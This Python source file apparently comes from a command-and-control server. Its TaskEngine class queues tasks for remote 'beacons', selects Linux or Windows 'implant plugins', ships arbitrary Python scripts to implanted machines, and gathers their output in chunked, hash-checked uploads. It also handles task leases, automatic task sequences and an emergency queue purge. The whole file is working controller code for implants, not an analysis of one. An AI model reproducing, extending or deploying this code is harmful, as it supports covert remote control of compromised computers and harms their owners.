from __future__ import annotations

import base64
import hashlib
import json
import shutil
import threading
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

from .code_delivery import CodeDeliveryPipeline
from .file_store import FileStore, new_id, now_iso
from .code_sanitizer import strip_comments


class TaskError(Exception):
    pass


class TaskEngine:
    TASK_LEASE_SECONDS = 8.0

    def __init__(self, store: FileStore, pipeline: CodeDeliveryPipeline):
        self.store = store
        self.pipeline = pipeline
        self._lock = threading.RLock()
        self._leases: dict[str, dict] = {}

    def create_task(
        self,
        beacon_id: str,
        *,
        plugin: str,
        mode: str = "plugin",
        source: str | None = None,
        args: dict | None = None,
        source_type: str = "plugin",
        risk: str = "R1",
        display: str = "",
        enqueue: bool = True,
    ) -> dict:
        task_id = new_id("task_")
        original_plugin = plugin
        if source is None:
            plugin = self.resolve_plugin(beacon_id, plugin)
            source = self.pipeline_source_for_plugin(plugin)
            source_type = "plugin"
        inline_removed = 0
        if plugin in {"lpython", "wpython"} and isinstance(args, dict) and args.get("code"):
            inline = strip_comments(str(args["code"]), filename="<inline-python>")
            args = dict(args)
            args["code"] = inline.source
            inline_removed = inline.removed_tokens
        prepared = self.pipeline.prepare(source, source_type, ref=task_id, filename=f"<{plugin or mode}>")
        wire_size = len(json.dumps({"source": prepared.source, "args": args or {}}, ensure_ascii=False).encode("utf-8"))
        if wire_size > 20 * 1024:
            raise TaskError(f"task payload exceeds 20KB transport limit ({wire_size} bytes); use chunked file upload or a smaller script")
        record = {
            "id": task_id,
            "beacon_id": beacon_id,
            "plugin": plugin,
            "mode": mode,
            "args": args or {},
            "risk": risk,
            "display": display or original_plugin,
            "status": "queued",
            "created_at": now_iso(),
            "dispatched_at": None,
            "started_at": None,
            "finished_at": None,
            "source_type": source_type,
            "original_hash": prepared.original_hash,
            "stripped_hash": prepared.stripped_hash,
            "removed_comment_tokens": prepared.removed_tokens + inline_removed,
            "inline_removed_comment_tokens": inline_removed,
            "source": prepared.source,
            "output": "",
            "error": "",
            "result": None,
        }
        self.store.write_json(f"tasks/{task_id}/task.json", record)
        if enqueue:
            with self._lock:
                queue_path = self.store.path(f"queues/{beacon_id}/pending.jsonl")
                queue_path.parent.mkdir(parents=True, exist_ok=True)
                self.store.append_jsonl(
                    f"queues/{beacon_id}/pending.jsonl",
                    {"task_id": task_id, "created_at": record["created_at"]},
                )
        self.store.event("task.created", {"task_id": task_id, "beacon_id": beacon_id, "plugin": plugin, "mode": mode})
        return self._public(record)

    def _plugin_exists(self, name: str) -> bool:
        plugins_root = self.store.root.parent / "implant_plugins"
        return any(path.stem == name or path.relative_to(plugins_root).as_posix()[:-3] == name for path in plugins_root.rglob("*.py"))

    def resolve_plugin(self, beacon_id: str, plugin: str) -> str:
        if not plugin or plugin.startswith("control."):
            return plugin
        record = self.store.read_json(f"beacons/{beacon_id}/beacon.json", default={})
        platform = str(record.get("platform", "")).lower()
        prefix = "l" if platform == "linux" else "w" if platform == "windows" else ""
        # Exact, already-prefixed names are accepted as-is.
        if self._plugin_exists(plugin):
            return plugin
        if prefix:
            prefixed = prefix + plugin
            if self._plugin_exists(prefixed):
                return prefixed
        return plugin

    def pipeline_source_for_plugin(self, plugin: str) -> str:
        # Plugin names use Linux command names; nested module paths such as
        # common/mkdir are also accepted.
        candidates = [plugin, plugin.replace(".", "/"), plugin.replace(".", "_")]
        roots = [self.store.root.parent / "implant_plugins"]
        for candidate in candidates:
            for root in roots:
                for path in root.rglob("*.py"):
                    rel = path.relative_to(root).as_posix()
                    stem = rel[:-3]
                    if candidate in {stem, path.stem, path.name}:
                        return path.read_text(encoding="utf-8")
        raise TaskError(f"implant plugin not found: {plugin}")

    def create_script_task(self, beacon_id: str, source: str, args: dict | None = None) -> dict:
        return self.create_task(
            beacon_id,
            plugin="python",
            mode="script",
            source=source,
            args=args or {},
            source_type="script",
            risk="R3",
            display="Python 脚本",
        )

    def create_control_task(self, beacon_id: str, action: str, payload: dict) -> dict:
        source = f'''PLUGIN = {{"name": "control.{action}", "commands": ["control.{action}"], "platform": "all"}}\n\ndef run(runtime, args):\n    return runtime.control({action!r}, args)\n'''
        return self.create_task(
            beacon_id,
            plugin=f"control.{action}",
            mode="plugin",
            source=source,
            args=payload,
            source_type="control",
            risk="R0",
            display=f"控制: {action}",
        )

    def list_tasks(self, beacon_id: str | None = None, limit: int = 200) -> list[dict]:
        tasks = []
        for directory in self.store.list_dirs("tasks"):
            record = self.store.read_json(f"tasks/{directory.name}/task.json")
            if not record:
                continue
            if beacon_id and record.get("beacon_id") != beacon_id:
                continue
            tasks.append(self._public(record))
        tasks.sort(key=lambda item: item.get("created_at", ""), reverse=True)
        return tasks[:limit]

    def get_task(self, task_id: str) -> dict:
        record = self.store.read_json(f"tasks/{task_id}/task.json")
        if not record:
            raise TaskError(f"task not found: {task_id}")
        result = self.store.read_json(f"results/{task_id}/result.json")
        public = self._public(record)
        if result:
            public["result"] = result
            public["output"] = result.get("output", "")
            public["error"] = result.get("error", "")
            if result.get("output_bytes") is not None:
                public["output_bytes"] = result["output_bytes"]
        return public

    def _auto_state_path(self, beacon_id: str) -> str:
        return f"queues/{beacon_id}/auto_state.json"

    def arm_auto_sequence(self, beacon_id: str, tasks: list[dict]) -> dict | None:
        if not tasks:
            return None
        state = {
            "beacon_id": beacon_id,
            "tasks": tasks,
            "index": 0,
            "inflight": None,
            "status": "running",
            "armed_at": now_iso(),
        }
        self.store.write_json(self._auto_state_path(beacon_id), state)
        self.store.event("auto_sequence.armed", {"beacon_id": beacon_id, "tasks": len(tasks)})
        return state

    def auto_mode(self, beacon_id: str) -> bool:
        state = self.store.read_json(self._auto_state_path(beacon_id), default={})
        if state.get("status") != "running":
            return False
        inflight = state.get("inflight")
        if inflight:
            record = self.store.read_json(f"tasks/{inflight}/task.json", default={})
            if record.get("status") in {"succeeded", "failed", "cancelled"} and int(state.get("index", 0)) >= len(state.get("tasks") or []):
                return False
        return True

    def _claim_auto(self, beacon_id: str) -> list[dict] | None:
        state = self.store.read_json(self._auto_state_path(beacon_id), default={})
        if state.get("status") != "running":
            return None
        inflight = state.get("inflight")
        if inflight:
            record = self.store.read_json(f"tasks/{inflight}/task.json", default={})
            if record and record.get("status") not in {"succeeded", "failed", "cancelled"}:
                return []
            state["inflight"] = None
            self.store.write_json(self._auto_state_path(beacon_id), state)
        tasks = state.get("tasks") or []
        index = int(state.get("index", 0))
        if index >= len(tasks):
            state["status"] = "done"
            state["completed_at"] = now_iso()
            self.store.write_json(self._auto_state_path(beacon_id), state)
            self.store.event("auto_sequence.completed", {"beacon_id": beacon_id})
            return None
        template = tasks[index] or {}
        state["index"] = index + 1
        self.store.write_json(self._auto_state_path(beacon_id), state)
        try:
            record = self.create_task(
                beacon_id,
                plugin=str(template.get("plugin") or template.get("command") or ""),
                args=template.get("args") or {},
                display=str(template.get("command") or template.get("plugin") or "auto"),
                risk="R1",
                enqueue=False,
            )
        except Exception as exc:
            self.store.event("auto_sequence.task_failed", {"beacon_id": beacon_id, "error": str(exc)})
            return self._claim_auto(beacon_id)
        task_id = record["id"]
        raw = self.store.read_json(f"tasks/{task_id}/task.json")
        raw["status"] = "dispatched"
        raw["dispatched_at"] = now_iso()
        raw["auto_sequence"] = True
        self.store.write_json(f"tasks/{task_id}/task.json", raw)
        state["inflight"] = task_id
        self.store.write_json(self._auto_state_path(beacon_id), state)
        return [{
            "task_id": task_id,
            "plugin": raw.get("plugin"),
            "mode": raw.get("mode", "plugin"),
            "source": raw.get("source", ""),
            "args": raw.get("args", {}),
            "display": raw.get("display", ""),
        }]

    def ack_tasks(self, beacon_id: str, task_ids: list[str]) -> dict:
        """Confirm task delivery. Leases are removed only after client ACK."""
        acknowledged = []
        with self._lock:
            for task_id in task_ids:
                lease = self._leases.get(str(task_id))
                if not lease or lease.get("beacon_id") != beacon_id:
                    continue
                self._leases.pop(str(task_id), None)
                record = self.store.read_json(f"tasks/{task_id}/task.json", default={})
                if record:
                    record["acknowledged_at"] = now_iso()
                    record["lease_until"] = None
                    self.store.write_json(f"tasks/{task_id}/task.json", record)
                acknowledged.append(str(task_id))
        return {"acknowledged": acknowledged, "count": len(acknowledged)}

    def _append_queue_entry(self, beacon_id: str, task_id: str, created_at: str | None = None) -> None:
        queue_rel = f"queues/{beacon_id}/pending.jsonl"
        existing = {str(item.get("task_id")) for item in self.store.iter_jsonl(queue_rel)}
        if task_id not in existing:
            self.store.append_jsonl(queue_rel, {"task_id": task_id, "created_at": created_at or now_iso()})

    def _expire_leases(self, beacon_id: str) -> None:
        now = time.time()
        for task_id, lease in list(self._leases.items()):
            if lease.get("beacon_id") != beacon_id or float(lease.get("expires_at", 0)) > now:
                continue
            record = self.store.read_json(f"tasks/{task_id}/task.json", default={})
            if not record or record.get("status") in {"succeeded", "failed", "cancelled"}:
                self._leases.pop(task_id, None)
                continue
            record["status"] = "queued"
            record["lease_until"] = None
            record["requeued_at"] = now_iso()
            self.store.write_json(f"tasks/{task_id}/task.json", record)
            self._leases.pop(task_id, None)
            self._append_queue_entry(beacon_id, task_id, record.get("created_at"))
            self.store.event("task.lease_expired", {"task_id": task_id, "beacon_id": beacon_id})

    def claim_tasks(self, beacon_id: str, limit: int = 8) -> list[dict]:
        with self._lock:
            auto = self._claim_auto(beacon_id)
            if auto is not None:
                return auto
            self._expire_leases(beacon_id)
            queue_rel = f"queues/{beacon_id}/pending.jsonl"
            entries = list(self.store.iter_jsonl(queue_rel))
            if not entries:
                return []
            selected = []
            remaining = []
            seen = set()
            for entry in entries:
                task_id = str(entry.get("task_id", ""))
                if not task_id or task_id in seen:
                    continue
                seen.add(task_id)
                record = self.store.read_json(f"tasks/{task_id}/task.json", default={})
                if not record or record.get("status") != "queued":
                    continue
                if len(selected) < limit:
                    selected.append(entry)
                else:
                    remaining.append(entry)
            queue_path = self.store.path(queue_rel)
            queue_path.parent.mkdir(parents=True, exist_ok=True)
            tmp = queue_path.with_suffix(".jsonl.tmp")
            with tmp.open("w", encoding="utf-8") as fh:
                for entry in remaining:
                    fh.write(json.dumps(entry, ensure_ascii=False) + "\n")
            import os

            os.replace(tmp, queue_path)
            claimed = []
            for entry in selected:
                task_id = entry["task_id"]
                record = self.store.read_json(f"tasks/{task_id}/task.json")
                if not record or record.get("status") != "queued":
                    continue
                record["status"] = "dispatched"
                record["dispatched_at"] = now_iso()
                record["delivery_count"] = int(record.get("delivery_count", 0)) + 1
                record["lease_until"] = (datetime.now().astimezone() + timedelta(seconds=self.TASK_LEASE_SECONDS)).isoformat()
                self.store.write_json(f"tasks/{task_id}/task.json", record)
                self._leases[task_id] = {
                    "beacon_id": beacon_id,
                    "expires_at": time.time() + self.TASK_LEASE_SECONDS,
                    "delivery_count": record["delivery_count"],
                }
                claimed.append(
                    {
                        "task_id": task_id,
                        "plugin": record.get("plugin"),
                        "mode": record.get("mode", "plugin"),
                        "source": record.get("source", ""),
                        "args": record.get("args", {}),
                        "display": record.get("display", ""),
                    }
                )
                self.store.event("task.dispatched", {"task_id": task_id, "beacon_id": beacon_id})
            return claimed

    def record_result_chunk(self, task_id: str, chunk_index: int, chunk_total: int, chunk_b64: str, chunk_hash: str = "") -> dict:
        record = self.store.read_json(f"tasks/{task_id}/task.json")
        if not record:
            raise TaskError(f"task not found: {task_id}")
        if chunk_total < 1 or chunk_index < 0 or chunk_index >= chunk_total:
            raise TaskError("invalid result chunk index")
        chunks_dir = self.store.path(f"results/{task_id}/chunks")
        chunks_dir.mkdir(parents=True, exist_ok=True)
        raw = base64.b64decode(chunk_b64)
        (chunks_dir / f"{chunk_index:06d}.part").write_bytes(raw)
        if len(list(chunks_dir.glob("*.part"))) < chunk_total:
            return {"complete": False, "received": len(list(chunks_dir.glob("*.part"))), "total": chunk_total}
        assembled = b"".join((chunks_dir / f"{i:06d}.part").read_bytes() for i in range(chunk_total))
        if chunk_hash and hashlib.sha256(assembled).hexdigest() != chunk_hash:
            shutil.rmtree(chunks_dir, ignore_errors=True)
            raise TaskError("result chunk hash mismatch")
        payload = json.loads(assembled.decode("utf-8"))
        result = self.record_result(
            task_id,
            output=str(payload.get("output", "")),
            error=str(payload.get("error", "")),
            data=payload.get("data"),
        )
        shutil.rmtree(chunks_dir, ignore_errors=True)
        return {"complete": True, "result": result}

    def record_result(self, task_id: str, output: str, error: str = "", data: Any = None, artifact: dict | None = None) -> dict:
        record = self.store.read_json(f"tasks/{task_id}/task.json")
        if not record:
            raise TaskError(f"task not found: {task_id}")
        status = "cancelled" if error == "cancelled" else ("failed" if error else "succeeded")
        result = {
            "task_id": task_id,
            "beacon_id": record.get("beacon_id"),
            "status": status,
            "output": output,
            "error": error,
            "data": data,
            "artifact": artifact,
            "output_bytes": len(output.encode("utf-8")),
            "received_at": now_iso(),
        }
        self.store.write_json(f"results/{task_id}/result.json", result)
        record["status"] = result["status"]
        record["finished_at"] = result["received_at"]
        record["output"] = output
        record["error"] = error
        record["lease_until"] = None
        self.store.write_json(f"tasks/{task_id}/task.json", record)
        with self._lock:
            self._leases.pop(task_id, None)
        self.store.event(
            "task.result_received",
            {"task_id": task_id, "beacon_id": record.get("beacon_id"), "status": record["status"], "bytes": result["output_bytes"]},
        )
        return result

    def purge_queued(self, beacon_id: str) -> dict:
        """Cancel tasks that are still waiting in this Beacon's execution queue.

        Tasks already dispatched to the Beacon are deliberately untouched.
        """
        with self._lock:
            for task_id, lease in list(self._leases.items()):
                if lease.get("beacon_id") == beacon_id:
                    self._leases.pop(task_id, None)
            cancelled = []
            for directory in self.store.list_dirs("tasks"):
                record = self.store.read_json(f"tasks/{directory.name}/task.json")
                if not record or record.get("beacon_id") != beacon_id or record.get("status") != "queued":
                    continue
                record["status"] = "cancelled"
                record["finished_at"] = now_iso()
                record["error"] = "cancelled by emergency queue stop"
                self.store.write_json(f"tasks/{record['id']}/task.json", record)
                cancelled.append(record["id"])
            queue_path = self.store.path(f"queues/{beacon_id}/pending.jsonl")
            queue_path.parent.mkdir(parents=True, exist_ok=True)
            queue_path.write_text("", encoding="utf-8")
            auto_path = self._auto_state_path(beacon_id)
            auto_state = self.store.read_json(auto_path, default=None)
            if auto_state:
                auto_state["status"] = "stopped"
                auto_state["tasks"] = []
                auto_state["index"] = 0
                auto_state["inflight"] = None
                auto_state["stopped_at"] = now_iso()
                self.store.write_json(auto_path, auto_state)
            self.store.event("task.queue_purged", {"beacon_id": beacon_id, "cancelled": len(cancelled), "cancelled_task_ids": cancelled})
            return {
                "beacon_id": beacon_id,
                "cancelled_count": len(cancelled),
                "cancelled_task_ids": cancelled,
                "cleared_queue": True,
                "dispatched_untouched": True,
            }

    def cancel_task(self, task_id: str) -> dict:
        record = self.store.read_json(f"tasks/{task_id}/task.json")
        if not record:
            raise TaskError(f"task not found: {task_id}")
        if record.get("status") in {"succeeded", "failed", "cancelled"}:
            return self._public(record)
        beacon_id = record["beacon_id"]
        control = self.create_control_task(beacon_id, "cancel_task", {"task_id": task_id})
        record["status"] = "cancel_requested"
        self.store.write_json(f"tasks/{task_id}/task.json", record)
        self.store.event("task.cancel_requested", {"task_id": task_id, "beacon_id": beacon_id, "control_task": control["id"]})
        return {"task": self._public(record), "control_task": control}

    def wait_for_task(self, task_id: str, timeout: float = 30.0, poll: float = 0.2) -> dict | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            record = self.store.read_json(f"tasks/{task_id}/task.json")
            if record and record.get("status") in {"succeeded", "failed", "cancelled"}:
                return self.get_task(task_id)
            time.sleep(poll)
        return None

    @staticmethod
    def _public(record: dict) -> dict:
        return {k: v for k, v in record.items() if k != "source"}
